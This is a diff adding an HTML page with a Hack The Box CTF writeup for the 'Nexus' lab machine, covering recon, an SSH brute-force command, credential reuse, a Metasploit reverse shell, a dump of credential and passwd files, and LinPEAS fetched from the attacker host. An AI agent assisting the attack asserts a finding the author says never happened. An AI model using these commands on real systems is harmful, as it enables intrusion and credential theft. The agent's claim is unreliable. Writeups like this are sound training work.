@@ -1,0 +1,1174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nexus - HTB - Writeup </title>
+<!-- Fonts & Icons -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+ 
+<style>
+:root {
+--bg-dark: #12161f;
+--card-bg: rgba(22, 28, 39, 0.85);
+--border-color: rgba(255, 255, 255, 0.08);
+--accent-green: #10b981;
+--accent-blue: #58a6ff;
+--accent-red: #ff7b72;
+--accent-yellow: #f2cc60;
+--accent-purple: #d2a8ff;
+--accent-glow: rgba(16, 185, 129, 0.15);
+--text-main: #f1f5f9;
+--text-sub: #94a3b8;
+--font-code: 'Fira Code', monospace;
+--font-sans: 'Inter', sans-serif;
+}
+ 
+* { margin: 0; padding: 0; box-sizing: border-box; }
+ 
+body {
+background-color: var(--bg-dark);
+color: var(--text-main);
+font-family: var(--font-sans);
+line-height: 1.8;
+padding-bottom: 60px;
+}
+ 
+.navbar {
+border-bottom: 1px solid var(--border-color);
+padding: 16px 0;
+background: rgba(18, 22, 31, 0.9);
+position: sticky;
+top: 0;
+z-index: 100;
+backdrop-filter: blur(8px);
+}
+ 
+.nav-container {
+max-width: 900px;
+margin: 0 auto;
+padding: 0 20px;
+display: flex;
+justify-content: space-between;
+align-items: center;
+}
+ 
+.logo {
+font-family: var(--font-code);
+font-weight: 700;
+color: var(--text-main);
+text-decoration: none;
+}
+ 
+.logo-accent { color: var(--accent-green); }
+ 
+.back-btn {
+color: var(--accent-green);
+text-decoration: none;
+font-family: var(--font-code);
+font-size: 0.9rem;
+}
+ 
+.article-container {
+max-width: 850px;
+margin: 40px auto;
+padding: 0 20px;
+}
+ 
+.article-box {
+background: var(--card-bg);
+border: 1px solid var(--border-color);
+border-radius: 12px;
+padding: 40px;
+box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+}
+ 
+.article-header {
+border-bottom: 1px solid var(--border-color);
+padding-bottom: 20px;
+margin-bottom: 30px;
+}
+ 
+.article-title {
+font-size: 1.8rem;
+font-weight: 700;
+line-height: 1.3;
+margin-bottom: 12px;
+}
+ 
+.article-meta {
+font-size: 0.85rem;
+color: var(--text-sub);
+font-family: var(--font-code);
+display: flex;
+gap: 15px;
+align-items: center;
+flex-wrap: wrap;
+}
+ 
+.badge { color: var(--accent-green); }
+ 
+.impact-highlights {
+background: rgba(16, 185, 129, 0.05);
+border-left: 4px solid var(--accent-green);
+padding: 15px 20px;
+margin: 25px 0;
+border-radius: 0 8px 8px 0;
+}
+ 
+.impact-highlights-warning {
+background: rgba(242, 204, 96, 0.05);
+border-left: 4px solid var(--accent-yellow);
+padding: 15px 20px;
+margin: 25px 0;
+border-radius: 0 8px 8px 0;
+}
+ 
+.impact-highlights ul {
+list-style: none;
+margin: 0;
+padding: 0;
+}
+ 
+.impact-highlights li {
+font-family: var(--font-code);
+font-size: 0.93rem;
+color: #e2e8f0;
+margin-bottom: 5px;
+}
+ 
+.impact-highlights-warning p {
+color: #e2e8f0;
+font-size: 0.95rem;
+margin-bottom: 10px;
+}
+ 
+.impact-highlights-warning p:last-child { margin-bottom: 0; }
+ 
+.impact-highlights-warning ul {
+list-style: none;
+margin: 0;
+padding: 0;
+}
+ 
+.impact-highlights-warning li {
+font-family: var(--font-code);
+font-size: 0.93rem;
+color: #e2e8f0;
+margin-bottom: 8px;
+}
+ 
+.article-body h2 {
+font-size: 1.3rem;
+font-family: var(--font-code);
+color: var(--accent-green);
+margin: 35px 0 15px 0;
+display: flex;
+align-items: center;
+gap: 10px;
+border-bottom: 1px solid var(--border-color);
+padding-bottom: 8px;
+}
+ 
+.port-tag {
+background-color: var(--accent-green);
+color: #0d1117;
+padding: 2px 8px;
+border-radius: 4px;
+font-family: var(--font-code);
+font-size: 0.85rem;
+font-weight: 600;
+}
+ 
+.article-body h3 {
+font-size: 1.05rem;
+font-family: var(--font-code);
+color: var(--accent-purple);
+margin: 20px 0 10px 0;
+}
+ 
+.article-body p {
+color: #cbd5e1;
+font-size: 0.98rem;
+margin-bottom: 18px;
+}
+ 
+.terminal-box {
+background: #0d1117;
+border: 1px solid var(--border-color);
+border-radius: 8px;
+padding: 15px 20px;
+font-family: var(--font-code);
+font-size: 0.88rem;
+color: #c9d1d9;
+margin: 20px 0;
+overflow-x: auto;
+white-space: pre-wrap;
+word-break: break-word;
+}
+ 
+.prompt { color: var(--accent-green); font-weight: bold; }
+.highlight { color: var(--accent-yellow); }
+.vulnerability { color: var(--accent-red); font-weight: bold; }
+ 
+.tree-box {
+font-family: var(--font-code);
+background-color: #0d1117;
+border: 1px solid var(--border-color);
+border-radius: 8px;
+padding: 15px;
+color: var(--accent-blue);
+font-size: 0.88rem;
+margin: 20px 0;
+white-space: pre;
+overflow-x: auto;
+}
+ 
+.img-container {
+margin: 25px 0;
+text-align: center;
+background: rgba(0, 0, 0, 0.2);
+padding: 15px;
+border-radius: 8px;
+border: 1px solid var(--border-color);
+}
+ 
+.img-container img {
+max-width: 100%;
+height: auto;
+border-radius: 6px;
+}
+ 
+.conclusion-box {
+background: rgba(255, 255, 255, 0.03);
+border: 1px solid var(--border-color);
+padding: 20px;
+border-radius: 8px;
+margin-top: 30px;
+font-family: var(--font-code);
+font-size: 0.85rem;
+color: var(--text-sub);
+font-style: italic;
+}
+ 
+code {
+font-family: var(--font-code);
+background: rgba(255, 255, 255, 0.06);
+padding: 2px 6px;
+border-radius: 4px;
+color: var(--accent-green);
+font-size: 0.9em;
+}
+ 
+ul, ol {
+margin-bottom: 18px;
+padding-left: 20px;
+color: #cbd5e1;
+}
+ 
+li { margin-bottom: 6px; }
+ 
+@media (max-width: 600px) {
+.article-box { padding: 20px; }
+.article-title { font-size: 1.4rem; }
+}
+</style>
+</head>
+<body>
+<header class="navbar">
+<div class="nav-container">
+<a href="../index.html" class="logo"><span class="logo-accent">&gt;</span> Omar Mesalam_</a>
+<a href="../index.html" class="back-btn">&larr; Back to Writeups</a>
+</div>
+</header>
+ 
+<div class="article-container">
+<article class="article-box">
+ 
+<header class="article-header">
+<h1 class="article-title">Nexus — Hack The Box CTF Writeup</h1>
+<div class="article-meta">
+<span class="badge">Omar Mesalam</span>
+<span>• Hack The Box CTF</span>
+<span>• Web Exploitation & Privilege Escalation</span>
+</div>
+</header>
+ 
+<div class="article-body">
+ 
+<div class="img-container">
+<img src="images/nexus1.png" alt="Proof of Concept Image 1">
+</div>
+ 
+<div class="impact-highlights-warning">
+<p><strong>Note:</strong> the target IP changed across sessions due to machine resets on HTB</p>
+</div>
+ 
+<h2><span class="port-tag">RECON</span> Reconnaissance</h2>
+ 
+<p>Nmap Scan — I started with a service/version and OS detection scan against the target:</p>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt">└─#</span> nmap -Pn -sV -sS -O 10.129.109.233                                                                    
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-31 20:46 EDT
+Nmap scan report for 10.129.109.233
+Host is up (0.34s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.16 seconds</div>
+ 
+<p>The scan reveals two open ports:</p>
+ 
+<p><strong>Port 22 (SSH):</strong> OpenSSH 9.6p1 on Ubuntu — likely not the initial attack vector unless credentials are found later. <strong>Port 80 (HTTP):</strong> nginx 1.24.0 running on Ubuntu — this is the most promising entry point and will be the focus of the next enumeration phase.</p>
+ 
+<p>I will start with check The versions before go deep in website</p>
+ 
+<div class="terminal-box">                                                                                                                       
+<span class="prompt">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt">└─#</span> searchsploit nginx 1.24.0 
+Exploits: No Results
+Shellcodes: No Results
+Papers: No Results                                                                                                                          
+<span class="prompt">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt">└─#</span> searchsploit OpenSSH 9.6p1
+Exploits: No Results
+Shellcodes: No Results
+Papers: No Results                                                                                                     
+              #---------------------------------------------#
+                            The Ai Agent 
+   ────────────────────────────────────────
+● search about cves
+   ────────────────────────────────────────
+╭─ ⚕ Hermes ───────────────────────────────────────────────────────────────────────────────────
+No major CVEs were found specifically for Nginx 1.24.0 in common vulnerability databases.
+╰──────────────────────────────────────────────────────────────────────────────────────────────
+────────────────────────────────────────
+● search about cves for port 22
+────────────────────────────────────────
+╭─ ⚕ Hermes ─────────────────────────────────────────────────────────────────────────────────────
+There are no major publicly listed exploits in searchsploit for this specific version on Ubuntu.</div>
+ 
+<p>Unfortunately, after searching for known vulnerabilities affecting the identified service versions, I couldn't find any relevant vulnerabilities to exploit</p>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt">└─#</span> nmap -p 22 --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos 10.129.109.233
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-31 21:15 EDT
+Nmap scan report for nexus.htb (10.129.109.233)
+Host is up (0.30s latency)
+ 
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-auth-methods: 
+|   Supported authentication methods: 
+|     publickey
+|_    password
+| ssh-hostkey: 
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+| ssh2-enum-algos: 
+|   kex_algorithms: (12)
+|       sntrup761x25519-sha512@openssh.com
+|       curve25519-sha256
+|       curve25519-sha256@libssh.org
+|       ecdh-sha2-nistp256
+|       ecdh-sha2-nistp384
+|       ecdh-sha2-nistp521
+|       diffie-hellman-group-exchange-sha256
+|       diffie-hellman-group16-sha512
+|       diffie-hellman-group18-sha512
+|       diffie-hellman-group14-sha256
+|       ext-info-s
+|       kex-strict-s-v00@openssh.com
+|   server_host_key_algorithms: (4)
+|       rsa-sha2-512
+|       rsa-sha2-256
+|       ecdsa-sha2-nistp256
+|       ssh-ed25519
+|   encryption_algorithms: (6)
+|       chacha20-poly1305@openssh.com
+|       aes128-ctr
+|       aes192-ctr
+|       aes256-ctr
+|       aes128-gcm@openssh.com
+|       aes256-gcm@openssh.com
+|   mac_algorithms: (10)
+|       umac-64-etm@openssh.com
+|       umac-128-etm@openssh.com
+|       hmac-sha2-256-etm@openssh.com
+|       hmac-sha2-512-etm@openssh.com
+|       hmac-sha1-etm@openssh.com
+|       umac-64@openssh.com
+|       umac-128@openssh.com
+|       hmac-sha2-256
+|       hmac-sha2-512
+|       hmac-sha1
+|   compression_algorithms: (2)
+|       none
+|_      zlib@openssh.com</div>
+ 
+<p>I then enumerated the SSH service on port 22 using Nmap. The server supports both password-based and public-key authentication. I also enumerated the supported SSH algorithms and host keys. Since password authentication is enabled, I decided to test whether any valid credentials could be discovered through controlled brute-force attempts</p>
+ 
+<p>Next, I decided to test the SSH service for weak credentials by performing a controlled brute-force attack using a username and password wordlist</p>
+ 
+<div class="terminal-box"><span class="prompt">──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt">└─#</span> hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/rockyou.txt ssh://10.129.109.233</div>
+ 
+<p>The brute-force attempt did not yield any valid SSH credentials</p>
+ 
+<p>I Think Now i will move to Http port with web application</p>
+ 
+<p>Now i will Start with Subdomain Enumeration</p>
+ 
+<div class="terminal-box">────────────────────────────────────────
+● do enum for subdomains http://nexus.htb with fuzz
+────────────────────────────────────────
+ 
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -mc 200,301,302  182.8s [exit 124]
+ 
+╭─ ⚕ Hermes ───────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+The previous attempt to use ffuf with Host: FUZZ.nexus.htb triggered a timeout and produced a large amount of output (it essentially caught every single word as a potential match due to the server's redirect behavior).
+ 
+Given that we already successfully identified billing.nexus.htb using gobuster vhost (which is purpose-built for this task), I recommend focusing on that path.</div>
+ 
+<p>After finish this Step i didnt find subdomains  (billing.nexus.htb)</p>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt">└─#</span> ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -mc 200        
+ 
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+ 
+       v2.1.0-dev
+________________________________________________
+ 
+ :: Method           : GET
+ :: URL              : http://nexus.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+ :: Header           : Host: FUZZ.nexus.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+ 
+git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 638ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)</div>
+ 
+<p>i found another subdomain ( git.nexus.htb )</p>
+ 
+<p>So i Think i will move to Directory and files enumeration</p>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt">└─#</span> dirsearch -u http://nexus.htb -e conf, config, bak, backup, swp, old, db, sql, asp, aspx, py, rb, php, bak, bhp, cache, cgi, conf, csv, html, inc, jar, js, json, jsp, lock, log, rar, old, sql, sql.gz, sql.zip, tar.gz, swp, tar, tar.bz2, tar.gz, txt, wadl, zip, log, xml, js, json 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+ 
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+ 
+Extensions: conf | HTTP method: GET | Threads: 25 | Wordlist size: 9478
+ 
+Output File: /home/mesalam/HTB/reports/http_nexus.htb/_26-08-31_21-29-28.txt
+ 
+Target: http://nexus.htb/
+ 
+[21:29:28] Starting:</div>
+ 
+<p>We didnt get any useful thing</p>
+ 
+<p>While browsing the main website, I discovered a potentially valid email address: j.matthew@nexus.htb I noted this address as a potential username and decided to use it during the SSH credential testing phase.</p>
+ 
+<div class="img-container">
+<img src="images/nexus2.png" alt="Proof of Concept Image 2">
+</div>
+ 
+<p>While enumerating the web application, I accessed <code>billing.nexus.htb</code> and discovered an <strong>Admin Login</strong> page.</p>
+ 
+<div class="img-container">
+<img src="images/nexus3.png" alt="Proof of Concept Image 3">
+</div>
+ 
+<p>While browsing <code>http://git.nexus.htb/admin</code>, I discovered a potentially interesting endpoint:</p>
+ 
+<p><code>http://git.nexus.htb/admin/krayin-docker-setup</code></p>
+ 
+<div class="img-container">
+<img src="images/nexus4.png" alt="Proof of Concept Image 4">
+</div>
+ 
+<div class="impact-highlights">
+<ul>
+<li>We discovered credentials in the following file: <code>http://git.nexus.htb/admin/krayin-docker-setup.env</code> ✅</li>
+</ul>
+</div>
+ 
+<h2><span class="port-tag">ACCESS</span> Initial Access</h2>
+ 
+<p>After discovering valid Password in the <code>.env</code> file, I used it to log in to the <code>billing.nexus.htb</code> web application with email we found in Nexus.htb</p>
+ 
+<div class="img-container">
+<img src="images/nexus5.png" alt="Proof of Concept Image 5">
+</div>
+ 
+<p>I searched for publicly known CVEs affecting the Krayin CRM application to identify potential vulnerabilities in the target</p>
+ 
+<div class="img-container">
+<img src="images/nexus6.png" alt="Proof of Concept Image 6">
+</div>
+ 
+<p>I researched the identified vulnerability and then applied the exploitation technique to the target</p>
+ 
+<div class="img-container">
+<img src="images/nexus7.png" alt="Proof of Concept Image 7">
+</div>
+ 
+<p>We identified a PHP Remote Code Execution (RCE) vulnerability through the email upload functionality. We exploited the vulnerability and successfully achieved command execution on the target system to verify the execution context, we ran <code>whoami</code>, which returned <code>www-data</code>, confirming that the commands were being executed with the privileges of the web server user</p>
+ 
+<div class="img-container">
+<img src="images/nexus8.png" alt="Proof of Concept Image 8">
+</div>
+ 
+<p>I configured Metasploit to set up a listener, started a local server, and generated a payload. I then uploaded the payload to the target server, allowing me to obtain a shell on the system</p>
+ 
+<div class="terminal-box">msf exploit(multi/handler) > set lhosts 10.10.14.45
+[!] Unknown datastore option: lhosts. Did you mean LHOST?
+lhosts => 10.10.14.45
+msf exploit(multi/handler) > run
+[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
+msf exploit(multi/handler) > set lhost 10.10.14.45
+lhost => 10.10.14.45
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.10.14.45:4444
+[*] Sending stage (41224 bytes) to 10.129.110.186
+[*] Meterpreter session 1 opened (10.10.14.45:4444 -> 10.129.110.186:49442) at 2026-09-01 13:59:54 -0400</div>
+ 
+<div class="impact-highlights">
+<ul>
+<li>We are now logged in to the system as the <code>www-data</code> user ✅</li>
+</ul>
+</div>
+ 
+<h2><span class="port-tag">LATERAL</span> Lateral Movement</h2>
+ 
+<p>I searched the system for additional credentials that could be used for further access or privilege escalation</p>
+ 
+<div class="terminal-box">www-data@nexus:~/krayin$ ls -lah
+ls -lah
+total 568K
+drwxr-xr-x 14 www-data www-data 4.0K May 12 12:06 .
+drwxr-xr-x  4 root     root     4.0K May 12 12:06 ..
+-rw-r--r--  1 www-data www-data  220 Mar 17 09:46 .editorconfig
+-rw-r--r--  1 www-data www-data 1.2K Apr 22 22:50 .env
+-rw-r--r--  1 www-data www-data 1.1K Mar 17 09:46 .env.example
+-rw-r--r--  1 www-data www-data  186 Mar 17 09:46 .gitattributes
+-rw-r--r--  1 www-data www-data  455 Mar 17 09:46 .gitignore
+-rw-r--r--  1 www-data www-data 3.3K Mar 17 09:46 CODE_OF_CONDUCT.md
+-rw-r--r--  1 www-data www-data 1.1K Mar 17 09:46 LICENSE
+-rw-r--r--  1 www-data www-data 5.8K Mar 17 09:46 README.md
+-rw-r--r--  1 www-data www-data 1.8K Mar 17 09:46 UPGRADE.md
+drwxr-xr-x  5 www-data www-data 4.0K May 12 12:06 app
+-rwxr-xr-x  1 www-data www-data  350 Mar 17 09:46 artisan
+drwxr-xr-x  3 www-data www-data 4.0K May 12 12:06 bootstrap
+-rw-r--r--  1 www-data www-data 3.8K Mar 17 09:46 composer.json
+-rw-r--r--  1 www-data www-data 444K Mar 17 09:46 composer.lock
+drwxr-xr-x  2 www-data www-data 4.0K May 12 12:06 config
+drwxr-xr-x  5 www-data www-data 4.0K May 12 12:06 database
+-rw-r--r--  1 www-data www-data   32 Mar 17 09:46 example.txt
+drwxr-xr-x  3 www-data www-data 4.0K May 12 12:06 lang
+-rw-r--r--  1 www-data www-data  216 Mar 17 09:46 package.json
+drwxr-xr-x  3 www-data www-data 4.0K May 12 12:06 packages
+-rw-r--r--  1 www-data www-data 1.2K Mar 17 09:46 phpunit.xml
+-rw-r--r--  1 www-data www-data  173 Mar 17 09:46 pint.json
+drwxr-xr-x  6 www-data www-data 4.0K May 12 12:06 public
+drwxr-xr-x  5 www-data www-data 4.0K May 12 12:06 resources
+drwxr-xr-x  2 www-data www-data 4.0K May 12 12:06 routes
+drwxrwxr-x  6 www-data www-data 4.0K May 12 12:06 storage
+drwxr-xr-x  4 www-data www-data 4.0K May 12 12:06 tests
+drwxr-xr-x 71 www-data www-data 4.0K May 12 12:06 vendor
+-rw-r--r--  1 www-data www-data  263 Mar 17 09:46 vite.config.js
+www-data@nexus:~/krayin$ cat .env
+cat .env
+APP_NAME="Krayin CRM"
+APP_ENV=local
+APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
+APP_DEBUG=true
+APP_URL=http://billing.nexus.htb
+APP_TIMEZONE=Asia/Kolkata
+APP_LOCALE=en
+APP_CURRENCY=USD
+ 
+VITE_HOST=
+VITE_PORT=
+ 
+LOG_CHANNEL=stack
+LOG_LEVEL=debug
+ 
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=krayin
+DB_USERNAME=krayin
+DB_PASSWORD=y27xb3ha!!74GbR
+DB_PREFIX=
+ 
+BROADCAST_DRIVER=log
+CACHE_DRIVER=file
+QUEUE_CONNECTION=sync
+SESSION_DRIVER=file
+SESSION_LIFETIME=120
+ 
+MEMCACHED_HOST=127.0.0.1
+ 
+REDIS_HOST=127.0.0.1
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+ 
+MAIL_MAILER=smtp
+MAIL_HOST=mailhog
+MAIL_PORT=1025
+MAIL_USERNAME=null
+MAIL_PASSWORD=null
+MAIL_ENCRYPTION=null
+MAIL_FROM_ADDRESS=laravel@krayincrm.com
+MAIL_FROM_NAME="${APP_NAME}"
+MAIL_DOMAIN=webkul.com
+ 
+MAIL_RECEIVER_DRIVER=sendgrid
+ 
+IMAP_HOST=imap.example.com
+IMAP_PORT=993
+IMAP_ENCRYPTION=ssl
+IMAP_VALIDATE_CERT=true
+IMAP_USERNAME=your_username
+IMAP_PASSWORD=your_password
+ 
+AWS_ACCESS_KEY_ID=
+AWS_SECRET_ACCESS_KEY=
+AWS_DEFAULT_REGION=us-east-1
+AWS_BUCKET=
+ 
+PUSHER_APP_ID=
+PUSHER_APP_KEY=
+PUSHER_APP_SECRET=
+PUSHER_APP_CLUSTER=mt1
+ 
+MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
+MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
+www-data@nexus:~/krayin$</div>
+ 
+<p>While searching the system for credentials, I discovered the following database password stored in the <code>.env</code> file: DB_PASSWORD=y27xb3ha!!74GbR</p>
+ 
+<p>I searched the system for available users.</p>
+ 
+<div class="terminal-box">www-data@nexus:~/krayin$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
+pollinate:x:102:1::/var/cache/pollinate:/bin/false
+polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
+syslog:x:103:104::/nonexistent:/usr/sbin/nologin
+uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
+tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:999:988::/var/log/laurel:/bin/false
+jones:x:1000:1000:,,,:/home/jones:/bin/bash
+mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
+git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
+dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false</div>
+ 
+<p>I found a user named <code>jones</code> on the system</p>
+ 
+<p>Now that we have a valid username and password, I attempted to authenticate to the target system via SSH using these credentials</p>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt">└─#</span> ssh jones@10.129.110.186
+jones@10.129.110.186's password:
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
+ 
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+ 
+ System information as of Tue Sep  1 18:12:09 PM UTC 2026
+ 
+  System load:           0.03
+  Usage of /:            66.7% of 6.48GB
+  Memory usage:          20%
+  Swap usage:            0%
+  Processes:             226
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.110.186
+  IPv6 address for eth0: dead:beef::a0de:adff:fe54:5ddc
+ 
+Expanded Security Maintenance for Applications is not enabled.
+ 
+1 update can be applied immediately.
+To see these additional updates run: apt list --upgradable
+ 
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+ 
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Last login: Tue Sep  1 18:12:11 2026 from 10.10.14.45
+jones@nexus:~$</div>
+ 
+<div class="impact-highlights">
+<ul>
+<li>We successfully logged in to the system via SSH using the <code>jones</code> account ✅</li>
+</ul>
+</div>
+ 
+<h2><span class="port-tag">PRIVESC</span> Privilege Escalation</h2>
+ 
+<p>Next, I started a local HTTP server on my machine to transfer the <code>LinPEAS</code> script to the target system for privilege escalation enumeration.</p>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/tools]</span>
+<span class="prompt">└─#</span> python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.14.45 - - [01/Sep/2026 15:08:43] "GET / HTTP/1.1" 200 -
+10.10.14.45 - - [01/Sep/2026 15:08:43] code 404, message File not found
+10.10.14.45 - - [01/Sep/2026 15:08:43] "GET /favicon.ico HTTP/1.1" 404 -
+10.129.110.186 - - [01/Sep/2026 15:09:04] "GET /linpeas.sh HTTP/1.1" 200 -</div>
+ 
+<div class="terminal-box">jones@nexus:~$ wget http://10.10.14.45:8000/linpeas.sh
+--2026-09-01 19:09:04--  http://10.10.14.45:8000/linpeas.sh
+Connecting to 10.10.14.45:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1063041 (1.0M) [application/x-sh]
+Saving to: 'linpeas.sh'
+linpeas.sh                100%[===================================>]   1.01M  96.8KB/s    in 11s
+2026-09-01 19:09:15 (95.7 KB/s) - 'linpeas.sh' saved [1063041/1063041]
+ 
+jones@nexus:~$ chmod +x linpeas.sh
+jones@nexus:~$./linpeas.sh</div>
+ 
+<p>During the privilege escalation enumeration, I identified a potential privilege escalation vector involving a scheduled cron job running with root</p>
+ 
+<div class="img-container">
+<img src="images/nexus9.png" alt="Proof of Concept Image 9">
+</div>
+ 
+<p>We will investigate this potential privilege escalation vector further</p>
+ 
+<div class="terminal-box">jones@nexus:~$ systemctl cat gitea-template-sync.timer
+# /etc/systemd/system/gitea-template-sync.timer
+[Unit]
+Description=Run Gitea template sync every minute
+ 
+[Timer]
+OnBootSec=1min
+OnUnitActiveSec=1min
+Unit=gitea-template-sync.service
+ 
+[Install]
+WantedBy=timers.target
+jones@nexus:~$ systemctl cat gitea-template-sync.service
+# /etc/systemd/system/gitea-template-sync.service
+[Unit]
+Description=Sync Gitea templates
+After=network-online.target
+ 
+[Service]
+Type=oneshot
+User=root
+ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
+TimeoutStartSec=50s
+jones@nexus:~$</div>
+ 
+<p>This means that the service executes a Python script with root privileges</p>
+ 
+<p>We inspected the Python script to determine whether it could be abused for privilege escalation</p>
+ 
+<div class="terminal-box">jones@nexus:~$ cat /etc/gitea/template-sync.py
+import os
